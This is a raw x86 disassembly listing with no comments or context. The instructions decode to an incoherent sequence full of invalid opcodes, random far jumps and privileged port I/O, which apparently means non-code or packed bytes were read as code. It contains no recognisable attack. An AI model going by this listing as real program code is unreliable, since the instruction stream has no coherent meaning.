  41f19a:	ror    DWORD PTR [edi+0x31625f7f],0x1f
  41f1a1:	jle    0x41f1df
  41f1a3:	adc    ah,0x54
  41f1a6:	inc    esp
  41f1a7:	and    eax,0xc3a56260
  41f1ac:	mov    ah,0x7b
  41f1ae:	sub    DWORD PTR [edi-0x4eac29dd],ebx
  41f1b4:	cmp    eax,0x5fd2d285
  41f1b9:	ss push esp
  41f1bb:	add    eax,0xe3ad14b9
  41f1c0:	mov    edx,0xf7f9a2dc
  41f1c5:	outs   dx,BYTE PTR ds:[esi]
  41f1c6:	fiadd  WORD PTR ds:0x582f2ee4
  41f1cc:	jmp    0xb942:0x9e29ced3
  41f1d3:	mov    ah,bh
  41f1d5:	jg     0x41f18c
  41f1d7:	push   DWORD PTR ds:0x94dbc436
  41f1dd:	jmp    0x143c103
  41f1e2:	mov    DWORD PTR [edi+0x2b],edx
  41f1e5:	and    eax,0xe87a4907
  41f1ea:	sbb    DWORD PTR [ecx],edi
  41f1ec:	addr16 adc eax,0xcb43126e
  41f1f2:	cmp    eax,0x51e5df6f
  41f1f7:	aam    0x5b
  41f1f9:	mov    eax,ds:0x312850bb
  41f1fe:	push   cs
  41f1ff:	in     eax,dx
  41f200:	out    0xa5,al
  41f202:	shl    DWORD PTR [ebx+eiz*8-0x2589ffe7],1
  41f209:	inc    ecx
  41f20a:	mov    ds:0xd7383821,eax
  41f20f:	loop   0x41f226
  41f211:	repz and BYTE PTR ds:[ecx-0x25a2f030],bl
  41f219:	xchg   edi,eax
  41f21a:	ds jg  0x41f299
  41f21d:	cmc    
  41f21e:	push   0x16
  41f220:	push   edx
  41f221:	cs fsubp st(0),st
  41f224:	test   BYTE PTR [eax-0x17be26c5],ch
  41f22a:	add    eax,0xef43c14d
  41f22f:	sub    DWORD PTR fs:[esi-0x29],edi
  41f233:	inc    ecx
  41f234:	push   edx
  41f235:	and    BYTE PTR [eax+0x33],dh
  41f238:	pop    ss
  41f239:	cmp    DWORD PTR [eax+0x71],eax
  41f23c:	add    eax,0x12a9c86e
  41f241:	data16 not ch
  41f244:	xchg   edx,eax
  41f245:	scas   eax,DWORD PTR es:[edi]
  41f246:	jge    0x41f1f2
  41f248:	out    0x56,al
  41f24a:	or     eax,0xb44cea6c
  41f24f:	push   ebx
  41f250:	sbb    eax,0xff8ea9e3
  41f255:	call   0xf0c3:0x99ab1645
  41f25c:	enter  0x342a,0xa3
  41f260:	imul   ebx,DWORD PTR [edx],0x139d7713
  41f266:	jge    0x41f237
  41f268:	and    esp,esi
  41f26a:	sub    DWORD PTR [ecx+0x68],esp
  41f26d:	icebp  
  41f26e:	jnp    0x41f210
  41f270:	cmp    BYTE PTR [eax+0x7574cea7],cl
  41f276:	cdq    
  41f277:	lods   al,BYTE PTR ds:[esi]
  41f278:	(bad)  
  41f279:	xor    al,0x81
  41f27b:	mov    ah,0x5f
  41f27d:	pop    edx
  41f27e:	add    bx,bx
  41f281:	cmp    DWORD PTR [ecx+0x5ea572dc],edi
  41f287:	popf   
  41f288:	mov    edi,0x10f79d5c
  41f28d:	out    0xff,al
  41f28f:	pop    edx
  41f290:	push   ss
  41f291:	jno    0x41f2bb
  41f293:	or     edi,DWORD PTR [edi-0x4e3ab031]
  41f299:	imul   BYTE PTR [ecx]
  41f29b:	test   al,0x2f
  41f29d:	xor    eax,0x5dfc8c20
  41f2a2:	pop    esp
  41f2a3:	(bad)  
  41f2a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2a5:	test   al,0x82
  41f2a7:	cmp    DWORD PTR [ecx],edx
  41f2a9:	adc    eax,DWORD PTR [eax-0x4ed5054b]
  41f2af:	jl     0x41f2a7
  41f2b1:	cdq    
  41f2b2:	dec    eax
  41f2b3:	test   al,0xb7
  41f2b5:	je     0x41f2ea
  41f2b7:	in     al,0xb2
  41f2b9:	push   eax
  41f2ba:	xor    al,0x5c
  41f2bc:	add    al,0xa7
  41f2be:	push   esp
  41f2bf:	jmp    0x70a3402a
  41f2c4:	inc    ebx
  41f2c5:	gs inc ecx
  41f2c7:	rcr    al,1
  41f2c9:	mov    bl,al
  41f2cb:	jmp    0xf267:0xd190da07
  41f2d2:	imul   esi,DWORD PTR fs:[ecx-0x1e075aa2],0xffffffbe
  41f2da:	rcl    DWORD PTR [ecx+0x16],1
  41f2dd:	cmc    
  41f2de:	test   DWORD PTR [ebx-0x2b],edi
  41f2e1:	aaa    
  41f2e2:	mov    WORD PTR [ebx-0x6f8a8f13],gs
  41f2e8:	inc    esi
  41f2e9:	retf   0xfbea
  41f2ec:	sbb    DWORD PTR [ebp-0x80],edx
  41f2ef:	clc    
  41f2f0:	dec    edi
  41f2f1:	sbb    DWORD PTR [ecx+ebx*4+0x1b7a1ca5],0x22841efc
  41f2fc:	scas   al,BYTE PTR es:[edi]
  41f2fd:	je     0x41f32f
  41f2ff:	cmc    
  41f300:	enter  0x1fc0,0x43
  41f304:	mov    ds:0xcd89f7a7,al
  41f309:	mov    ds:0x18ba7a73,eax
  41f30e:	mov    ds:0xb8fb1c38,al
  41f313:	jno    0x41f357
  41f315:	add    esp,ebx
  41f317:	and    eax,0x378cc50e
  41f31c:	add    BYTE PTR gs:[eax],al
  41f31f:	add    BYTE PTR [eax],al
  41f321:	add    BYTE PTR [ebx],ch
  41f323:	mov    eax,ds:0xf6cb1443
  41f328:	jg     0x41f2e9
  41f32a:	test   ch,ch
  41f32c:	out    dx,al
  41f32d:	sbb    BYTE PTR ds:0xe6840b0d,0x6d
  41f334:	add    DWORD PTR [eax],eax
  41f336:	repz add al,0x0
  41f339:	add    BYTE PTR [ecx-0x71ab3e0f],bh
  41f33f:	pop    ebx
  41f340:	mov    cl,0x25
  41f342:	xor    al,BYTE PTR [edx+eiz*2+0x44]
  41f346:	int    0xda
  41f348:	pushf  
  41f349:	repz adc eax,0xddd5405f
  41f34f:	(bad)  
  41f350:	sbb    esp,edi
  41f352:	mov    bh,0x18
  41f354:	call   0xac84:0x4f530267
  41f35b:	mov    edi,0x3f3522f3
  41f360:	aaa    
  41f361:	arpl   WORD PTR [ebp+0x7e77d677],bp
  41f367:	jmp    0xb0c3:0xadae5a78
  41f36e:	inc    edi
  41f36f:	(bad)
  41f372:	test   ah,bl
  41f374:	xchg   DWORD PTR [edx+0x6a],ecx
  41f377:	sub    BYTE PTR [esi-0x124c7470],bh
  41f37d:	sbb    bh,BYTE PTR [eax]
  41f37f:	dec    eax
  41f380:	xchg   esp,eax
  41f381:	aaa    
  41f382:	es jne 0x41f335
  41f385:	mov    ds:0xc2cb3c49,eax
  41f38a:	xor    eax,0x144de412
  41f38f:	fild   QWORD PTR [ebx]
  41f391:	mov    al,0x51
  41f393:	hlt    
  41f394:	shl    BYTE PTR [eax+0x25e11a17],0xdd
  41f39b:	push   0x75
  41f39d:	out    dx,eax
  41f39e:	inc    eax
  41f39f:	(bad)  
  41f3a0:	dec    edx
  41f3a1:	leave  
  41f3a2:	cdq    
  41f3a3:	xchg   edx,eax
  41f3a4:	pop    es
  41f3a5:	rol    DWORD PTR [eax-0x3abb3be3],1
  41f3ab:	pop    ebp
  41f3ac:	mov    al,0xf2
  41f3ae:	in     al,dx
  41f3af:	push   esi
  41f3b0:	lods   al,BYTE PTR ds:[esi]
  41f3b1:	test   al,0x3b
  41f3b3:	fsub   st,st(0)
  41f3b5:	xchg   bh,bh
  41f3b7:	imul   eax,DWORD PTR [edx-0x3688525d],0x3b
  41f3be:	out    0x67,al
  41f3c0:	je     0x41f421
  41f3c2:	dec    edx
  41f3c3:	or     eax,0xf23cf9db
  41f3c8:	mov    ah,0x96
  41f3ca:	xchg   esi,eax
  41f3cb:	sahf   
  41f3cc:	mov    ds:0x9780beb9,eax
  41f3d1:	or     DWORD PTR [ebx],ebp
  41f3d3:	das    
  41f3d4:	(bad)  
  41f3d5:	cmp    eax,0xf27bd76c
  41f3da:	mov    esi,0x294f0b2e
  41f3df:	jnp    0x41f3f8
  41f3e1:	dec    esi
  41f3e2:	inc    ebx
  41f3e3:	test   DWORD PTR [ecx],eax
  41f3e5:	retf   
  41f3e6:	push   edi
  41f3e7:	push   ecx
  41f3e8:	jl     0x41f393
  41f3ea:	loopne 0x41f407
  41f3ec:	test   ebx,esp
  41f3ee:	cmp    al,0x6a
  41f3f0:	sub    al,0xaf
  41f3f2:	pop    esi
  41f3f3:	xchg   esi,eax
  41f3f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3f5:	or     BYTE PTR [ecx-0x323e604f],ah
  41f3fb:	je     0x41f462
  41f3fd:	ficom  DWORD PTR [eax+0x1c]
  41f400:	lahf   
  41f401:	inc    edx
  41f402:	repz adc edi,ebp
  41f405:	mov    dl,0xfd
  41f407:	jg     0x41f3d5
  41f409:	lea    esi,[ecx+eiz*8-0x57]
  41f40d:	fs mov esp,gs
  41f410:	jmp    0xbfd2:0x487fa08f
  41f417:	shr    ecx,0x76
  41f41a:	cmp    DWORD PTR [edx-0x53],eax
  41f41d:	pop    es
  41f41e:	jge    0x41f436
  41f420:	int    0x4e
  41f422:	jg     0x41f433
  41f424:	aad    0x24
  41f426:	loopne 0x41f3ba
  41f428:	inc    DWORD PTR [ebx-0x2058401c]
  41f42e:	bound  ebx,QWORD PTR [edi-0x5a]
  41f431:	sbb    BYTE PTR [esi],al
  41f433:	(bad)  
  41f434:	cvtps2pd xmm4,QWORD PTR [ebp-0x4b81e2e7]
  41f43b:	je     0x41f467
  41f43d:	out    dx,eax
  41f43e:	adc    al,dh
  41f440:	popf   
  41f441:	or     ebx,DWORD PTR [edx+0x7e]
  41f444:	push   0xfffffffd
  41f446:	xor    al,0xc3
  41f448:	sar    DWORD PTR [edx-0x793bdae5],1
  41f44e:	adc    edi,DWORD PTR [eax-0x16124d0a]
  41f454:	or     edx,eax
  41f456:	xchg   ebx,eax
  41f457:	outs   dx,BYTE PTR ds:[esi]
  41f458:	jmp    0x41f3dd
  41f45a:	loop   0x41f49c
  41f45c:	cmp    ebx,ebx
  41f45e:	std    
  41f45f:	ins    BYTE PTR es:[edi],dx
  41f460:	(bad)  
  41f461:	fs out 0x7f,eax
  41f464:	and    ebp,edx
  41f466:	aaa    
  41f467:	mov    ebp,DWORD PTR [esi+0x39]
  41f46a:	dec    ecx
  41f46b:	adc    dh,BYTE PTR [esp+eiz*4-0x3b]
  41f46f:	fwait
  41f470:	and    eax,0x88d6466a
  41f475:	mov    ds:0x8628382a,eax
  41f47a:	retf   
  41f47b:	in     al,dx
  41f47c:	fldenv [edi+0xa]
  41f47f:	ret    0xdd72
  41f482:	add    ebp,0xe
  41f485:	push   0xe8b56aa3
  41f48a:	fimul  WORD PTR [edx-0x8]
  41f48d:	stos   BYTE PTR es:[edi],al
  41f48e:	(bad)  
  41f48f:	push   ecx
  41f490:	sub    BYTE PTR [ecx],ch
  41f492:	shr    BYTE PTR [esi-0x2f],1
  41f495:	adc    edx,DWORD PTR [ebx]
  41f497:	jnp    0x41f45c
  41f499:	aas    
  41f49a:	ins    BYTE PTR es:[edi],dx
  41f49b:	mov    eax,0x4e558a86
  41f4a0:	mov    eax,ds:0xc99179f3
  41f4a5:	jp     0x41f4f6
  41f4a7:	and    al,0x73
  41f4a9:	jbe    0x41f444
  41f4ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4ac:	jmp    0x63652c07
  41f4b1:	dec    ebp
  41f4b2:	dec    ebp
  41f4b3:	sbb    BYTE PTR [ebx+edi*8+0x1ca15893],cl
  41f4ba:	imul   edi,DWORD PTR [esi],0x77732299
  41f4c0:	loope  0x41f488
  41f4c2:	cli    
  41f4c3:	cwde   
  41f4c4:	(bad)  
  41f4c6:	push   ds
  41f4c7:	jno    0x41f47e
  41f4c9:	pop    ebp
  41f4ca:	ror    BYTE PTR cs:[esi],1
  41f4cd:	sub    BYTE PTR [eax+0x68f919d],0x16
  41f4d4:	es dec eax
  41f4d6:	push   0xffffffc9
  41f4d8:	sbb    ebx,DWORD PTR [ebx]
  41f4da:	xchg   BYTE PTR [edi-0x23],ah
  41f4dd:	lea    ebp,[edx]
  41f4df:	jmp    0x41f4ad
  41f4e1:	imul   ebx,DWORD PTR [esi],0xbf8c1cba
  41f4e7:	sbb    DWORD PTR [ecx],0xfffffffb
  41f4ea:	lds    ecx,FWORD PTR [edi+0x3b5bd351]
  41f4f0:	dec    ecx
  41f4f1:	jae    0x41f499
  41f4f3:	in     eax,dx
  41f4f4:	xchg   ebp,eax
  41f4f5:	or     al,0x4
  41f4f7:	jbe    0x41f574
  41f4f9:	xchg   ecx,eax
  41f4fa:	(bad)  
  41f4fb:	fld    QWORD PTR [ecx-0x5d]
  41f4fe:	(bad)  
  41f4ff:	out    dx,al
  41f500:	je     0x41f57b
  41f502:	retf   0x1fe
  41f505:	mov    cl,0xdc
  41f507:	pop    ebx
  41f508:	scas   eax,DWORD PTR es:[edi]
  41f509:	js     0x41f53e
  41f50b:	cs dec ebp
  41f50d:	xlat   BYTE PTR ds:[ebx]
  41f50e:	bnd ja 0x41f4c7
  41f511:	xchg   ebx,eax
  41f512:	xor    esp,DWORD PTR [eax+0x1b65dec1]
  41f518:	or     BYTE PTR [ecx+0x50],bl
  41f51b:	sbb    bh,BYTE PTR [edx+0x3c]
  41f51e:	mov    edi,0xb437f2de
  41f523:	inc    ebp
  41f524:	inc    eax
  41f525:	enterw 0x8954,0x76
  41f52a:	xchg   DWORD PTR ds:0x52029257,esp
  41f530:	imul   eax,DWORD PTR [eax-0x35],0xcd8329b6
  41f537:	inc    esp
  41f538:	mov    eax,0x3bca31ab
  41f53d:	and    DWORD PTR [esi],esp
  41f53f:	cmp    BYTE PTR [esi+0x4bed490d],ch
  41f545:	xor    ch,BYTE PTR [esi-0x75]
  41f548:	pop    esp
  41f549:	les    esi,FWORD PTR [edi-0x64316dc0]
  41f54f:	fwait
  41f550:	jmp    0x20026e87
  41f555:	mul    BYTE PTR [edi]
  41f557:	sahf   
  41f558:	mov    ah,0xb0
  41f55a:	push   ecx
  41f55b:	ins    DWORD PTR es:[edi],dx
  41f55c:	out    dx,al
  41f55d:	dec    eax
  41f55e:	scas   eax,DWORD PTR es:[edi]
  41f55f:	hlt    
  41f560:	dec    esi
  41f561:	ret    0xccc9
  41f564:	mov    dl,0xe1
  41f566:	cmc    
  41f567:	call   eax
  41f569:	sub    BYTE PTR [edi],0xb0
  41f56c:	or     eax,0x429f7b1b
  41f571:	jmp    0x41f542
  41f573:	cmp    al,0x67
  41f575:	stos   DWORD PTR es:[edi],eax
  41f576:	inc    esi
  41f577:	and    dl,bl
  41f579:	push   esp
  41f57a:	aam    0xee
  41f57c:	sbb    DWORD PTR [ecx],0xffffffd4
  41f57f:	add    DWORD PTR gs:0x2d4fa90c,ecx
  41f586:	repz adc al,0x3d
  41f589:	mov    esi,0x96061468
  41f58e:	xchg   esi,eax
  41f58f:	sbb    DWORD PTR [ebp+0xc],eax
  41f592:	int3   
  41f593:	push   ds
  41f594:	(bad)  
  41f595:	mov    edi,ebp
  41f597:	mov    al,0x7c
  41f599:	mov    eax,ds:0xfb1cf0b2
  41f59e:	mov    ds:0x7be56124,al
  41f5a3:	or     al,0x3c
  41f5a5:	or     bh,BYTE PTR [eax-0x17]
  41f5a8:	sbb    eax,0xe8ed0169
  41f5ad:	push   edi
  41f5ae:	pop    edi
  41f5af:	fcom   st(7)
  41f5b1:	adc    BYTE PTR [edi-0x7f],0xc1
  41f5b5:	inc    ebx
  41f5b6:	adc    eax,0x72a7833e
  41f5bb:	jbe    0x41f5f9
  41f5bd:	cmc    
  41f5be:	fidiv  DWORD PTR [edi+0x68854dc]
  41f5c4:	and    dh,BYTE PTR [ecx+0x7e64dcc5]
  41f5ca:	pop    es
  41f5cb:	jmp    FWORD PTR [edx-0x7b512b2]
  41f5d1:	les    ebp,FWORD PTR cs:[ecx]
  41f5d4:	cmp    DWORD PTR [edi],edi
  41f5d6:	out    0x82,eax
  41f5d8:	add    dh,BYTE PTR ds:0x2493f1f3
  41f5de:	outs   dx,DWORD PTR ds:[esi]
  41f5df:	lea    edi,[edi]
  41f5e1:	inc    eax
  41f5e2:	test   eax,0x955121ff
  41f5e7:	jne    0x41f5c0
  41f5e9:	mov    esp,0x189f750f
  41f5ee:	jge    0x41f5f7
  41f5f0:	iret   
  41f5f1:	push   esi
  41f5f2:	out    dx,eax
  41f5f3:	mov    ds:0x8e4b3b74,al
  41f5f8:	pop    esp
  41f5f9:	js     0x41f5f1
  41f5fb:	test   eax,0x4fedc08c
  41f600:	xchg   ecx,eax
  41f601:	or     DWORD PTR [eax-0xad73759],ebp
  41f607:	js     0x41f5c4
  41f609:	(bad)  [ebx+eiz*1-0x61]
  41f60d:	jno    0x41f594
  41f60f:	pop    ebx
  41f610:	cdq    
  41f611:	fdivr  QWORD PTR [esi-0x4e]
  41f614:	pop    ss
  41f615:	outs   dx,DWORD PTR ds:[esi]
  41f616:	dec    esp
  41f617:	xor    edx,DWORD PTR [esi+0x41]
  41f61a:	out    0xca,al
  41f61c:	adc    bl,BYTE PTR [ecx+0x4b]
  41f61f:	push   esp
  41f620:	ret    
  41f621:	repz in al,dx
  41f623:	add    al,0x22
  41f625:	push   ebx
  41f626:	outs   dx,DWORD PTR ds:[esi]
  41f627:	pop    ss
  41f628:	xor    eax,0x33653dfc
  41f62d:	in     al,0x19
  41f62f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f630:	retf   
  41f631:	mov    WORD PTR [esi],ss
  41f633:	retf   0x69f3
  41f636:	pop    edx
  41f637:	test   eax,0xbc5ff379
  41f63c:	dec    ecx
  41f63d:	int    0xb9
  41f63f:	push   edi
  41f640:	mov    fs,WORD PTR [edi]
  41f642:	neg    bl
  41f644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f645:	retf   0xe048
  41f648:	daa    
  41f649:	fstp   DWORD PTR [eax]
  41f64b:	dec    esi
  41f64c:	cmc    
  41f64d:	(bad)  
  41f64e:	mov    bh,0x94
  41f650:	pop    es
  41f651:	cdq    
  41f652:	aas    
  41f653:	xchg   edi,eax
  41f654:	ja     0x41f65a
  41f656:	pop    eax
  41f657:	test   eax,0x86c71190
  41f65c:	sahf   
  41f65d:	ror    BYTE PTR [ebx-0x3],cl
  41f660:	ror    BYTE PTR [edx],1
  41f662:	call   0x3add:0xff07859
  41f669:	xchg   ebp,eax
  41f66a:	fsubrp st(0),st
  41f66c:	cmp    eax,0x2bfa0b23
  41f671:	mov    cl,0x61
  41f673:	cmp    ebx,ecx
  41f675:	pop    ds
  41f676:	mov    dh,0xab
  41f678:	add    al,0xbf
  41f67a:	sub    eax,DWORD PTR [esi+esi*4]
  41f67d:	out    0x42,eax
  41f67f:	in     al,dx
  41f680:	out    dx,eax
  41f681:	jbe    0x41f616
  41f683:	out    0x6f,eax
  41f685:	adc    DWORD PTR [esi+0x128592ac],0xffffffd4
  41f68c:	call   0x67fe:0xae6c303b
  41f693:	out    dx,al
  41f694:	jb     0x41f6a3
  41f696:	adc    DWORD PTR [eax-0x1e95b4dd],esi
  41f69c:	js     0x41f695
  41f69e:	out    0xb9,eax
  41f6a0:	stos   BYTE PTR es:[edi],al
  41f6a1:	shl    DWORD PTR [edi+edi*8-0x7f],1
  41f6a5:	jo     0x41f720
  41f6a7:	adc    BYTE PTR [esi-0x696d4993],cl
  41f6ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6af:	scas   al,BYTE PTR es:[edi]
  41f6b0:	mov    BYTE PTR [edx+0x37dfabf0],bl
  41f6b6:	and    bl,ch
  41f6b8:	push   esi
  41f6b9:	push   0x5b
  41f6bb:	shr    DWORD PTR [ebx+0xdc5c506],1
  41f6c1:	cmc    
  41f6c2:	fwait
  41f6c3:	mov    dh,0xac
  41f6c5:	dec    esi
  41f6c6:	repnz cmp esi,edx
  41f6c9:	enter  0x9736,0x5a
  41f6cd:	sbb    BYTE PTR [edx+0x6c],0x71
  41f6d1:	xor    ebp,ebx
  41f6d3:	in     al,dx
  41f6d4:	mov    eax,eax
  41f6d6:	fimul  WORD PTR [ebx+0x8]
  41f6d9:	mov    bh,BYTE PTR [edi]
  41f6db:	inc    esi
  41f6dc:	aaa    
  41f6dd:	pop    ecx
  41f6de:	ins    DWORD PTR es:[edi],dx
  41f6df:	aas    
  41f6e0:	ret    
  41f6e1:	push   esp
  41f6e2:	jp     0x41f760
  41f6e4:	fst    QWORD PTR [edx-0x2d31c4a5]
  41f6ea:	mov    bh,0x12
  41f6ec:	aam    0xb3
  41f6ee:	retf   0x5932
  41f6f1:	ds jl  0x41f690
  41f6f4:	data16 arpl WORD PTR [eax],dx
  41f6f7:	sub    ebx,DWORD PTR [ecx]
  41f6f9:	arpl   WORD PTR es:[ebp-0x25],cx
  41f6fd:	test   al,0x5e
  41f6ff:	sar    BYTE PTR [esi-0x54],0x79
  41f703:	xor    al,0xde
  41f705:	std    
  41f706:	(bad)  
  41f707:	not    ah
  41f709:	or     al,0x9b
  41f70b:	xchg   esp,eax
  41f70c:	sub    BYTE PTR [ecx],ah
  41f70e:	mov    al,ds:0x6b894b61
  41f713:	loop   0x41f6d9
  41f715:	das    
  41f716:	cld    
  41f717:	sti    
  41f718:	inc    esi
  41f719:	(bad)  
  41f71a:	fyl2xp1 
  41f71c:	gs jne 0x41f70d
  41f71f:	mov    esi,0xfff486ed
  41f724:	add    eax,0xe5fa1dab
  41f729:	sar    BYTE PTR [ebp+0x44d32da5],cl
  41f72f:	pop    ss
  41f730:	lods   al,BYTE PTR ds:[esi]
  41f731:	adc    dl,BYTE PTR [esi+0x40]
  41f734:	adc    DWORD PTR [edx+0x17],0x60fe32c
  41f73b:	mov    eax,0x8dfdaf86
  41f740:	mov    ch,0xc5
  41f742:	les    eax,FWORD PTR [eax]
  41f744:	mov    al,bh
  41f746:	lahf   
  41f747:	pop    DWORD PTR [edx-0x78]
  41f74a:	sbb    al,0x26
  41f74c:	test   eax,0xf10ce0a1
  41f751:	popf   
  41f752:	or     DWORD PTR [ecx],esp
  41f754:	(bad)  
  41f755:	enter  0x5f62,0x45
  41f759:	fdivr  st,st(1)
  41f75b:	add    BYTE PTR [ebx-0x28],ch
  41f75e:	out    dx,eax
  41f75f:	adc    ebx,DWORD PTR [edi+ebp*1-0x60]
  41f763:	adc    edx,DWORD PTR [ebx]
  41f765:	push   ecx
  41f766:	into   
  41f767:	pop    ds
  41f768:	scas   al,BYTE PTR es:[edi]
  41f769:	nop
  41f76a:	daa    
  41f76b:	xchg   BYTE PTR [esi-0x536a59fc],cl
  41f771:	(bad)  
  41f773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f774:	fbld   TBYTE PTR [edx+0x52]
  41f777:	outs   dx,DWORD PTR ds:[esi]
  41f778:	cmp    esi,DWORD PTR [ebx-0x5e]
  41f77b:	add    eax,0xc1518ab5
  41f780:	ret    0x2cd1
  41f783:	fsubr  DWORD PTR [edx-0x6b]
  41f786:	jns    0x41f7bd
  41f788:	stc    
  41f789:	sub    bh,BYTE PTR [ebp+0x35]
  41f78c:	inc    esp
  41f78d:	fbstp  TBYTE PTR [eax+0x5b]
  41f790:	push   ecx
  41f791:	mov    ds:0xf0bfbf94,al
  41f796:	push   ss
  41f797:	icebp  
  41f798:	pushf  
  41f799:	mov    esi,0x932672f1
  41f79e:	sub    DWORD PTR [edx],eax
  41f7a0:	clc    
  41f7a1:	cmp    DWORD PTR [esi+eax*1],ecx
  41f7a4:	out    dx,eax
  41f7a5:	(bad)  
  41f7a6:	lods   eax,DWORD PTR ds:[esi]
  41f7a7:	dec    ebp
  41f7a8:	add    al,0x63
  41f7aa:	and    esp,edx
  41f7ac:	cmp    eax,0x2ac8c04c
  41f7b1:	xchg   esp,eax
  41f7b2:	scas   al,BYTE PTR es:[edi]
  41f7b3:	mov    al,0x30
  41f7b5:	xchg   BYTE PTR [edx+0x3b],cl
  41f7b8:	xor    al,0x70
  41f7ba:	sub    al,0x53
  41f7bc:	gs sbb eax,0x164ca556
  41f7c2:	and    ah,BYTE PTR [eax-0x1b]
  41f7c5:	out    0xec,al
  41f7c7:	pop    eax
  41f7c8:	pop    ss
  41f7c9:	adc    al,al
  41f7cb:	adc    esi,edi
  41f7cd:	iret   
  41f7ce:	pushf  
  41f7cf:	xlat   BYTE PTR ds:[ebx]
  41f7d0:	js     0x41f840
  41f7d2:	ds mov ebx,0x9f269da9
  41f7d8:	sbb    eax,0x8922012b
  41f7dd:	mov    al,ds:0x80468bad
  41f7e2:	fadd   DWORD PTR [edx]
  41f7e4:	xor    eax,0x3e1a43a1
  41f7e9:	fs mov esi,0x15ad99b0
  41f7ef:	test   BYTE PTR [ebp+0x7a33e4b1],dh
  41f7f5:	std    
  41f7f6:	adc    DWORD PTR [esi-0x38],ecx
  41f7f9:	aaa    
  41f7fa:	fild   WORD PTR [edi-0x61]
  41f7fd:	add    al,0xf4
  41f7ff:	ret    0xf8bd
  41f802:	push   esi
  41f803:	adc    bh,0xcc
  41f806:	cmp    bl,bl
  41f808:	push   es
  41f809:	mov    esp,0x59e248db
  41f80e:	xor    edx,DWORD PTR [edi]
  41f810:	or     eax,0xafec8299
  41f815:	mov    dh,cl
  41f817:	pop    edx
  41f818:	dec    esi
  41f819:	int3   
  41f81a:	add    eax,0x50ace139
  41f81f:	out    dx,al
  41f820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f821:	sbb    DWORD PTR [edi+0x68],edx
  41f824:	loopne 0x41f887
  41f826:	lock cmp eax,0xa261463f
  41f82c:	les    eax,FWORD PTR [eax]
  41f82e:	add    BYTE PTR [eax],al
  41f830:	add    BYTE PTR [eax],al
  41f832:	dec    eax
  41f833:	mul    BYTE PTR fs:[eax-0x2]
  41f837:	repnz fisubr WORD PTR [ecx+eiz*8-0x64]
  41f83c:	out    0x52,eax
  41f83e:	or     cl,BYTE PTR [esi]
  41f840:	sub    bh,BYTE PTR [edi-0x27]
  41f843:	jb     0x41f846
  41f845:	add    bl,dh
  41f847:	add    al,0x0
  41f849:	add    dh,al
  41f84b:	push   edi
  41f84c:	and    BYTE PTR [ebx-0x3d],al
  41f84f:	sub    dl,ch
  41f851:	cmc    
  41f852:	(bad)  
  41f853:	ins    BYTE PTR es:[edi],dx
  41f854:	jmp    0xb248aa86
  41f859:	jle    0x41f84f
  41f85b:	xchg   DWORD PTR [ebp+0x31],eax
  41f85e:	or     eax,0x2f522cb7
  41f863:	cmp    eax,0xdc5a3513
  41f868:	cmc    
  41f869:	sbb    eax,0x2a8da608
  41f86e:	cmp    ah,bl
  41f870:	jne    0x41f8e2
  41f872:	inc    esi
  41f873:	jb     0x41f889
  41f875:	mov    ah,ah
  41f877:	pop    eax
  41f878:	ret    0xd410
  41f87b:	pop    esp
  41f87c:	sub    DWORD PTR [ebx-0x1cf5b26f],edi
  41f882:	cmp    BYTE PTR [edx+0x59e2bf4f],0x1e
  41f889:	shl    DWORD PTR [esi+0x951bea6],cl
  41f88f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f890:	aam    0xae
  41f892:	int3   
  41f893:	fcmovbe st,st(4)
  41f895:	dec    esi
  41f896:	xchg   esp,eax
  41f897:	out    dx,al
  41f898:	jmp    0x473d:0xcff8d93a
  41f89f:	xlat   BYTE PTR ds:[ebx]
  41f8a0:	jns    0x41f8a1
  41f8a2:	push   cs
  41f8a3:	dec    ebp
  41f8a4:	lock sbb al,0xa5
  41f8a7:	xor    ch,ch
  41f8a9:	lea    ebp,es:[esi+eax*1+0x2a]
  41f8ae:	shl    BYTE PTR [edi+0x2e3f9a9d],1
  41f8b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8b5:	sub    bh,BYTE PTR ds:[ecx]
  41f8b8:	iret   
  41f8b9:	vmwrite ecx,DWORD PTR [ecx]
  41f8bc:	mov    dh,0xb9
  41f8be:	push   eax
  41f8bf:	xchg   edx,eax
  41f8c0:	xchg   ebp,eax
  41f8c1:	fidivr WORD PTR [edx+0x3c1f28a5]
  41f8c7:	test   BYTE PTR [ebx],cl
  41f8c9:	sbb    eax,0xba56fe43
  41f8ce:	nop
  41f8cf:	loop   0x41f92e
  41f8d1:	ss pop ds
  41f8d3:	or     eax,0x76560fcd
  41f8d8:	lods   eax,DWORD PTR ds:[esi]
  41f8d9:	mov    dl,0x17
  41f8db:	mov    al,0xce
  41f8dd:	add    ebp,DWORD PTR [ecx-0x3b29f745]
  41f8e3:	mov    al,0xe2
  41f8e5:	inc    edi
  41f8e6:	sbb    BYTE PTR [eax+0x4],ch
  41f8e9:	cli    
  41f8ea:	adc    edi,ebp
  41f8ec:	or     bl,cl
  41f8ee:	jle    0x41f8fa
  41f8f0:	sub    DWORD PTR [ebx+edi*4+0x4e],ebp
  41f8f4:	add    ebx,DWORD PTR [edi]
  41f8f6:	add    al,0xd5
  41f8f8:	push   es
  41f8f9:	add    al,0x7c
  41f8fb:	sti    
  41f8fc:	xchg   ebp,eax
  41f8fd:	ins    DWORD PTR es:[edi],dx
  41f8fe:	(bad)  
  41f8ff:	lods   eax,DWORD PTR ds:[esi]
  41f900:	out    0xe5,al
  41f902:	mov    dl,0xa0
  41f904:	lods   eax,DWORD PTR ds:[esi]
  41f905:	jne    0x41f91c
  41f907:	retf   0xf3af
  41f90a:	jb     0x41f8ba
  41f90c:	dec    BYTE PTR [ecx+0x0]
  41f90f:	mov    esp,0x6fac9281
  41f914:	es daa 
  41f916:	push   es
  41f917:	enter  0x9b79,0x3d
  41f91b:	in     al,0x9f
  41f91d:	bound  esi,QWORD PTR [edi+0x47]
  41f920:	push   ds
  41f921:	sbb    eax,DWORD PTR [edi+0x41bf2a5f]
  41f927:	pop    ebx
